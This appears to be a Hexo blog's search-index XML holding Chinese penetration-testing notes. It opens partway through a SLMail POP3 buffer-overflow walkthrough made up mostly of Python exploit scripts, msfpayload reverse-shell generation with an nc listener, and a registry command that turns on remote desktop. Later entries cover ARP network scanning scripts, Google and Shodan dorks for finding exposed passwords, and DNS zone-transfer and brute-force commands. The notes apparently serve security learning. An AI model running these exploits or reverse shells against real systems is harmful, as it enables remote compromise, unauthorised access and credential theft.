c3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="number">39694438</span>`<span class="comment">#计算EIP寄存器内存地址ASCII码在2700唯一字符串中的偏移量</span></span><br><span class="line">&gt;<span class="comment">#### python代码`05.py`</span></span><br><span class="line">```python</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*<span class="number">20</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>思路:<br>将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,将跳转到shellcode代码段并执行；<br>寻找可存放shellcode的内存空间</p><blockquote><h4 id="python代码06-py"><a href="#python代码06-py" class="headerlink" title="python代码06.py"></a>python代码<code>06.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*(<span class="number">3500</span><span class="number">-2606</span><span class="number">-4</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>不同类型的程序,协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途<br>    返回地址,Shellcode,buffer中都不能出现坏字符<br>    null byte (0x00) 空字符,用于终止字符串的拷贝操作<br>    return (0x0D)回车操作,表示POP3 PASS命令输入完成<br>    思路:发送0x00—-0xff 256个字符,查找所有坏字符<br>    00000000 11111111 256 #二进制</p><blockquote><h4 id="python代码07-py"><a href="#python代码07-py" class="headerlink" title="python代码07.py"></a>python代码<code>07.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span></span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span></span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span></span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span></span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span></span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span></span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><pre><code>0x0A    0x0D    0x00    #坏字符</code></pre><p>重定向数据流<br>    用ESP的地址替换EIP的值<br>    但是ESP地址变化,硬编码不可行<br>    SLMaail线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定<br>变通思路<br>    在内存中寻找地址固定的系统模块<br>    在模块中寻找JMP ESP 指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode<br>    mona.py脚本识别内存模块,搜索”return address”是JMP ESP指令的模块<br>    寻找无DEP,ALSR保护的内存地址<br>    内存地址不包含坏字符<br>    寻找不受保护的系统模块<br>        !mona modules<br>    将汇编指令jmp esp 转换为二进制<br>        <code>/usr/share/metasploit-framework/tools/exploit/masm_shell.rb</code><br>        FFE4<br>    在模块中搜索FFE4指令<br>    <code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code><br>        选择不包含坏字符的内存地址<br>    在该地址设置断点<br>    重发buffer</p><blockquote><h4 id="python代码08-py-地址全翻转"><a href="#python代码08-py-地址全翻转" class="headerlink" title="python代码08.py(地址全翻转)"></a>python代码<code>08.py</code>(地址全翻转)</h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"C"</span>*<span class="number">390</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4></blockquote><p><code>Scratch</code>        #写shellcode的工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfpayload -l</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 C</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 R | .&#x2F;msfencode -b &quot;\x00\x0a\x0d&quot;</span><br><span class="line">nc -vip 443</span><br></pre></td></tr></table></figure><blockquote><h4 id="python代码09-py"><a href="#python代码09-py" class="headerlink" title="python代码09.py"></a>python代码<code>09.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span>+</span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span>+</span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span>+</span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span>+</span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span>+</span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span>+</span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span>+</span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span>+</span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span>+</span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span>+</span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span>+</span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span>+</span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span>+</span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span>+</span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span>+</span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"\x90"</span>*<span class="number">8</span>+shellcode</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>shellcode执行结束后以ExitProcess方式推出整个进程,将导致邮件服务崩溃；<br>Slmail是一个基于线程的应用,适用ExitThread方式可以避免整个服务崩溃,可实现重复溢出；<br><code>./msfpayload win32_reverse lhost=1.1.1.1 EXITFUNC=thread lport=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code><br>    cmd注册表开启3389<br>    <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>    RegSnap #工具</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Buffer overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议的数据链路层扫描探测</title>
      <link href="/2013/03/15/pentest/ARP%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/"/>
      <url>/2013/03/15/pentest/ARP%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p>Data link (Arp) 二层发现<br>优点：扫描速度块，可靠<br>缺点：不可路由<br>Arp协议<br>抓包</p><pre><code>ifconfigdhclient eth0arping 1.1.1.1 -c 1arping 192.168.1.1 -d #arp欺骗检测</code></pre><blockquote><p>Bash脚本：<code>arping1.sh</code>  #扫描网段</p></blockquote><pre><code>#!/bin/bashif [&quot;$#&quot; -ne 1 ]:then  echo &quot;Usage - ./arping.sh [interface]&quot;  echo &quot;Example - ./arping.sh eth0&quot;  echo &quot;Example will preform an ARP scan of the local subnet to which eth0 is assigned&quot;  exitfiinterface=$1prefix=$(ifconfig $interface | grep &apos;inet addr&apos; | cut -d &apos;:&apos; -f 2 | cut -d &apos; &apos; -f 1 | cut -d &apos;.&apos; -f 1-3)for addr in $(seq 1 254); do  arping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 | cut -d&quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1done</code></pre><blockquote><p>NMAP</p></blockquote><pre><code>nmap 191.168.1.1-254 -sn    or    nmap 192.168.1.0/24 -snnmap -iL iplist.txt -sn</code></pre><blockquote><p>Netdiscover</p></blockquote><p>专用于二层发现<br>可用于无线和交换网络环境<br>主动肯被动探测</p><pre><code>主动：    netdiscover -i eth0 -r 1.1.1.0/24    netdiscover -l iplist.txt被动：    netdiscover -p     主动arp容易触发报警</code></pre><blockquote><p>Scapy</p></blockquote><pre><code>作为Python库进行调用也可作为单独工具使用抓包，分析，创建，修改，注入网络流量apt-get install python-gnuplotScapy    ARP().display()    Sr1()</code></pre><blockquote><p>Python脚本:<code>Arp1.py</code> </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"example will perform an ARP scan of the local subnet to which eht0 is assigned"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">interface=str(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ip=subprocess.check_output(<span class="string">"ifconfig"</span>+interface+<span class="string">" | grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1"</span>,shell=<span class="literal">True</span>).strip()</span><br><span class="line">prefix=ip.split(<span class="string">'.'</span>)[<span class="number">0</span>]+ip.split(<span class="string">'.'</span>)[<span class="number">1</span>]+<span class="string">'.'</span>+ip.split(<span class="string">'.'</span>)[<span class="number">2</span>]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">254</span>):</span><br><span class="line">answer=sr1(ARP(pdst=prefix+str(addr)),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> answer==<span class="literal">None</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> prefix+str(addr)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主动信息收集 </tag>
            
            <tag> 扫描开发 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Search Hacking信息收集姿势</title>
      <link href="/2013/03/12/pentest/Search%20Hacking%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%A7%BF%E5%8A%BF/"/>
      <url>/2013/03/12/pentest/Search%20Hacking%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>SHODAN</p></blockquote><pre><code>net:8.8.8.8    or net:8.8.8.0/24 country:CN city:beijing port:22os:&quot;windows&quot;server:apachehostname:google.com</code></pre><p>example:<br>200 OK cisco country:JP<br>user:amdin pass:password<br>linux upnp avtech</p><blockquote><p>google hacking</p></blockquote><p><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">GHDB</a></p><pre><code>title:关键字 indext:关键字 indext:关键字inurl:/../../inurl:/admin/login.phpinurl:qq.txtinurl:ftp &quot;password&quot; filetype:xls inurl:service.pwdfiletype:xls &quot;username | password&quot;intitle:&quot;netbotz appliance&quot; &quot;ok&quot;</code></pre><blockquote><p>theHarvester （并发多引擎搜索）<br>metagoofil    (并发多引擎文件搜索)<br>Maltego</p></blockquote><p>CUPP– common User Password Proliler (根据用户信息生成密码字典)</p><pre><code>get clone https://github.com/Mebus/cupp.get</code></pre><blockquote><p>METADATA图片源信息查看</p></blockquote><p>exiftool x.jpg  #查看图片exif信息<br>foca            #windows查看图片源数据工具</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 被动信息收集 </tag>
            
            <tag> SHODAN </tag>
            
            <tag> GOOGLE HACKING </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>已知域名解析查询</title>
      <link href="/2013/03/11/pentest/%E5%B7%B2%E7%9F%A5%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/"/>
      <url>/2013/03/11/pentest/%E5%B7%B2%E7%9F%A5%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>nslookup</p></blockquote><pre><code>nslookup sina.com type=any</code></pre><blockquote><p>DIG</p></blockquote><pre><code>dig sina.com any @1.1.1.1dig mail.163.com anydig +trace www.sian.com  #根域追踪  劫持查询</code></pre><blockquote><p>DNS区域传输</p></blockquote><pre><code>dig sina.com nsdig @ns1.example.com example.com axfrhost -T -l sina.com ns2.sina.com</code></pre><blockquote><p>DNS字典爆破</p></blockquote><pre><code>fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist hosts.txtdnsdict6 -d4 -t 16 -x sina.com #字典质量高，速度块dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -a sina.xmldnsmap sina.com -w dns.txtdnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt  #快dnsrecon -t std -d sina.com</code></pre><blockquote><p>查找字典位置</p></blockquote><pre><code>dpkg -L fiercefind / -name dnsenum</code></pre><blockquote><p>DNS注册信息</p></blockquote><pre><code>whois whois -h whois.apnic.net 1.1.1.1</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 被动信息收集 </tag>
            
            <tag> kali </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
